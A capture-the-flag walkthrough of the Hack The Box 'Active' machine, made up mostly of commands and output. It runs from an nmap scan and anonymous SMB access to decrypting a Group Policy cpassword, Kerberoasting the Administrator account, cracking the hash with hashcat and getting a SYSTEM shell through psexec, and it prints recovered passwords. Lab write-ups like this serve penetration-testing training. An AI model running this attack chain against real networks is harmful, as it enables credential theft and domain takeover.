
<head>
   <link rel="stylesheet" href="css/retro.css">
</head>git 
----
### Summary

![Active](images/active.png)

Additonal resources/reading:
* [Group Policy Pwnage](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)
* [Kerberos Roasting](https://pentestlab.blog/2018/06/12/kerberoast/)
* [Official course walkthrough](https://www.udemy.com/course/practical-ethical-hacking/learn/lecture/17282948#content)


---
### Scanning/Enumeration
---
#### nmap 
```Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-28 06:06 MST
Nmap scan report for 10.10.10.100
Host is up (0.059s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-02-28 13:08:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/28%OT=53%CT=1%CU=37406%PV=Y%DS=2%DC=T%G=Y%TM=5E59111
OS:3%P=x86_64-apple-darwin19.0.0)SEQ(SP=104%GCD=1%ISR=108%TI=I%CI=I%II=I%SS
OS:=S%TS=7)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11
OS:%O5=M54DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%
OS:W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%
OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=8
OS:0%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
OS:Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m12s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-02-28T13:09:45
|_  start_date: 2020-02-28T13:07:29

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   63.60 ms 10.10.14.1
2   57.65 ms 10.10.10.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 209.76 seconds
```

### Vulnerabilities

List of potential vulnerabilites to consider:
```
searchsploit windows 2008 r2 
--------------------------------------------------------- -----------------------------------------------
 Exploit Title                                           |  Path
                                                         | (/usr/local/opt/exploitdb/share/exploitdb/)
--------------------------------------------------------- -----------------------------------------------
Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) - Lo | exploits/windows/local/39719.ps1
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote C | exploits/windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'Etern | exploits/windows/remote/42315.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' | exploits/windows_x86-64/remote/41987.py
--------------------------------------------------------- -----------------------------------------------
```
```
--------------------------------------------------------- ------------------------------------------------
 Exploit Title                                           |  Path
                                                         | (/usr/local/opt/exploitdb/share/exploitdb/)
--------------------------------------------------------- ------------------------------------------------
Microsoft DNS RPC Service - 'extractQuotedChar()' Remote | exploits/windows/remote/16366.rb
Microsoft DNS RPC Service - 'extractQuotedChar()' TCP Ov | exploits/windows/remote/16748.rb
Microsoft RPC DCOM Interface - Remote Overflow (MS03-026 | exploits/windows/remote/16749.rb
Microsoft Windows - 'Lsasrv.dll' RPC Remote Buffer Overf | exploits/windows/remote/293.c
Microsoft Windows - 'RPC DCOM' Long Filename Overflow (M | exploits/windows/remote/100.c
Microsoft Windows - 'RPC DCOM' Remote (1)                | exploits/windows/remote/69.c
Microsoft Windows - 'RPC DCOM' Remote (2)                | exploits/windows/remote/70.c
Microsoft Windows - 'RPC DCOM' Remote (Universal)        | exploits/windows/remote/76.c
Microsoft Windows - 'RPC DCOM' Remote Buffer Overflow    | exploits/windows/remote/64.c
Microsoft Windows - 'RPC DCOM' Scanner (MS03-039)        | exploits/windows/remote/97.c
Microsoft Windows - 'RPC DCOM2' Remote (MS03-039)        | exploits/windows/remote/103.c
Microsoft Windows - DCOM RPC Interface Buffer Overrun    | exploits/windows/remote/22917.txt
Microsoft Windows - DNS RPC Remote Buffer Overflow (2)   | exploits/windows/remote/3746.txt
Microsoft Windows - Net-NTLMv2 Reflection DCOM/RPC (Meta | exploits/windows/local/45562.rb
```

---

### Exploits 
---

#### 1. Get a shell on the target system. 
Let's focus on SMB2 port 445 by connecting via smbclient
```
sudo smbclient -L \\\\10.10.10.100\\
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```
After trying to connect to the different shares, Replication is the only one with anonymous login

```
> sudo smbclient \\\\10.10.10.100\\Replication\\
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloByte
s/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as GPE.INI (0.5 KiloBytes/sec) (averag
e 0.3 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as GptTmp
l.inf (4.1 KiloBytes/sec) (average 1.6 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (1.9 Ki
loBytes/sec) (average 1.7 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as Registry.pol (10.5 KiloBytes/sec) 
(average 3.5 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as GPT.INI (0.1 KiloBytes/sec) (average 2.9 KiloByte
s/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as GptTmp
l.inf (14.5 KiloBytes/sec) (average 4.6 KiloBytes/sec)
```
We're interested in the Groups.xml file.

```
~/Documents/code/scratch/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

 We get a user name and password to crack...
 ```
 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
GPPstillStandingStrong2k18
 ```
user => "active.htb\SVC_TGS"
password=> "GPPstillStandingStrong2k18"

Tried and failed with the following... 
```
» sudo secretsdump.py active\SVC_TGS:'GPPstillStandingStrong2k18'@10.10.10.100
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[*] Cleaning up... 
nostromo :: ~ » sudo psexec.py 'active.htb'/SVC_TGS:GPPstillStandingStrong2k18@10.10.10.100
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'Replication' is not writable.
[-] share 'SYSVOL' is not writable.
[-] share 'Users' is not writable.

» sudo secretsdump.py active/SVC_TGS:'GPPstillStandingStrong2k18'@10.10.10.100
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something wen't wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up... 

» sudo secretsdump.py active/SVC_TGS:'GPPstillStandingStrong2k18'@10.10.10.100 -use-vss
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Searching for NTDS.dit
[-] 'NoneType' object has no attribute 'request'
[*] Cleaning up... 

» sudo crackmapexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k1
/Library/Python/2.7/site-packages/beautifulsoup4-4.8.2-py2.7.egg/bs4/element.py:16: UserWarning: The soupsieve package is not installed. CSS selectors cannot be used.
  'The soupsieve package is not installed. CSS selectors cannot be used.'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:ACTIVE) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [-] ACTIVE\SVC_TGS:GPPstillStandingStrong2k1 STATUS_LOGON_FAILURE 
```

#### 2. Privilige Escalation

Hint is in the name 'SVC_TGS'. Kerberos roasting attack...

```
/tools/impacket/examples » sudo python GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                  
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 13:06:40.351723  2018-07-30 11:17:40.656520 


$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$a763807889f08f18fcbaf77cb1bc89ff$8fabf0318e34e7aa8c8756e1c60f7de68a28ff4332a5393fc1daf86bc84af81aedd2c2198978955fd70023a45dcad3e935395204e991910bbf83e4955c5b1c4b68292b755a63eafbeba521ec7cecd0d8ca6b09cf7df223cbd19fcc1c768d8807721769cfee7e62f7e422fe3cf8408161ec9e933bafe2f91bd9ee732d5918bc1cecce31412109ea47413280ae5913bb4a6bccc37928ec5eb613b2b8fddab86811bb3299b59bd919075434220e809ae36f0f65d483b37bfdc3f43e1df32267f34ac36e7dcb8bb5bee61df3d1268a3c2714c1a0c72d3f6590af7ceddb93a4d295f8087e846fca3f008e0f6d462fce9faf700b11d063654eb572540c2cd2c75cd026384e96b6445c35f1be8fc52e369e67bb94bd5a77f0d042fbe116faf812e990d0a90078cc975a66af6a07d49d5c2cba82a6e96b64f4da543d1a0e7f567e12a729a31aaaa87355d89ab9ad55dd5b06950bdf5303300d48e6bfe2fd18b7ae74128455798a3f75ff8ff619e6b4804297526a87f6054a61bd5a52d502698ec4e4f2be6a9cdc28260bd32b7531867fdff3a2b7faeedf51a7941db2ef33a85cc1adb655cccc8a9d14a6289b5f16a5b068acc1edda57956827a8a5058ac34eb6e220b4175fdc81bcc5664402184e94e6d0c3c025c7717b31eb4c6c60908fb1985400f62bd11ff33ae60d1c09cd1bd876976b43953d67b731f8d26a1672fdcdfaccfba0a2b90426a8864300fd8b0f3ece64fe861dbd304ca593915af3c49bf90eed0b0761336cd2eab9ba0ecba48766539d41e88086ed032ceef9b675cb3363a5b9c375181f048a4ad9aa94fc14248376956aa28d8894b24a2c00f91a8bc7c4f6f509f74f727d36cf46e15253ec81d3c7843c549e43982867519fc93a0e68b4e5097d350dad27ba066eacded75df0b47ea6e879cb47c24f6f08b615e9b1d739b05e3d8bbbaa4130f8a13271ac92271e238caf20b1880d92fd7666f0824ee32b71c4de3e1b536a1cc7736425bcf0a9679763bcfb0a37bb84513e9f9e715df5ed54d495ebae292b27501be58bf853f896d501939623138874066eafa8f342038607faeafd862d51a9f5bc4d0f614d074bbaa508d5f52b76ca36d47c404a3422b782187e3fe524bee61e1f8b7fd4c598e50a0cf90bae85fafe1f0ba4f43b7fe84ab53c10a10b643f5d3967d25caf7a753234c4a629083046bdd0fa91b53dd2c5a0d1639cd616ea1746bf3dde16bc6614fbb20b49eb33ca302c48e91588f1e054
```
Crack the hash...
```
sudo hashcat -m 13100 spn2.txt /usr/share/wordlists/rockyou.txt  --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i9-8950HK CPU @ 2.90GHz, 2048/4592 MB allocatable, 1MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=13100 -D _unroll'
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$a763807889f08f18fcbaf77cb1bc89ff$8fabf0318e34e7aa8c8756e1c60f7de68a28ff4332a5393fc1daf86bc84af81aedd2c2198978955fd70023a45dcad3e935395204e991910bbf83e4955c5b1c4b68292b755a63eafbeba521ec7cecd0d8ca6b09cf7df223cbd19fcc1c768d8807721769cfee7e62f7e422fe3cf8408161ec9e933bafe2f91bd9ee732d5918bc1cecce31412109ea47413280ae5913bb4a6bccc37928ec5eb613b2b8fddab86811bb3299b59bd919075434220e809ae36f0f65d483b37bfdc3f43e1df32267f34ac36e7dcb8bb5bee61df3d1268a3c2714c1a0c72d3f6590af7ceddb93a4d295f8087e846fca3f008e0f6d462fce9faf700b11d063654eb572540c2cd2c75cd026384e96b6445c35f1be8fc52e369e67bb94bd5a77f0d042fbe116faf812e990d0a90078cc975a66af6a07d49d5c2cba82a6e96b64f4da543d1a0e7f567e12a729a31aaaa87355d89ab9ad55dd5b06950bdf5303300d48e6bfe2fd18b7ae74128455798a3f75ff8ff619e6b4804297526a87f6054a61bd5a52d502698ec4e4f2be6a9cdc28260bd32b7531867fdff3a2b7faeedf51a7941db2ef33a85cc1adb655cccc8a9d14a6289b5f16a5b068acc1edda57956827a8a5058ac34eb6e220b4175fdc81bcc5664402184e94e6d0c3c025c7717b31eb4c6c60908fb1985400f62bd11ff33ae60d1c09cd1bd876976b43953d67b731f8d26a1672fdcdfaccfba0a2b90426a8864300fd8b0f3ece64fe861dbd304ca593915af3c49bf90eed0b0761336cd2eab9ba0ecba48766539d41e88086ed032ceef9b675cb3363a5b9c375181f048a4ad9aa94fc14248376956aa28d8894b24a2c00f91a8bc7c4f6f509f74f727d36cf46e15253ec81d3c7843c549e43982867519fc93a0e68b4e5097d350dad27ba066eacded75df0b47ea6e879cb47c24f6f08b615e9b1d739b05e3d8bbbaa4130f8a13271ac92271e238caf20b1880d92fd7666f0824ee32b71c4de3e1b536a1cc7736425bcf0a9679763bcfb0a37bb84513e9f9e715df5ed54d495ebae292b27501be58bf853f896d501939623138874066eafa8f342038607faeafd862d51a9f5bc4d0f614d074bbaa508d5f52b76ca36d47c404a3422b782187e3fe524bee61e1f8b7fd4c598e50a0cf90bae85fafe1f0ba4f43b7fe84ab53c10a10b643f5d3967d25caf7a753234c4a629083046bdd0fa91b53dd2c5a0d1639cd616ea1746bf3dde16bc6614fbb20b49eb33ca302c48e91588f1e054:Ticketmaster1968
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 TGS-REP etype 23
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~4...f1e054
Time.Started.....: Sat Feb 29 09:47:12 2020 (22 secs)
Time.Estimated...: Sat Feb 29 09:47:34 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   462.3 kH/s (7.20ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Tioncurtis23 -> Thelittlemermaid
```
And we're in...

```
» sudo psexec.py active/Administrator:Ticketmaster1968@10.10.10.100                            1 ↵
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file DfEEQnxf.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service BHpM on 10.10.10.100.....
[*] Starting service BHpM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>sysinfo
b"'sysinfo' is not recognized as an internal or external command,\r\noperable program or batch file.\r\n"
C:\Windows\system32>systeminfo


Host Name:                 DC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84027
Original Install Date:     16/7/2018, 1:13:22 úú
System Boot Time:          29/2/2020, 3:17:28 úú
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.314 MB
Virtual Memory: Max Size:  8.189 MB
Virtual Memory: Available: 7.479 MB
Virtual Memory: In Use:    710 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    active.htb

```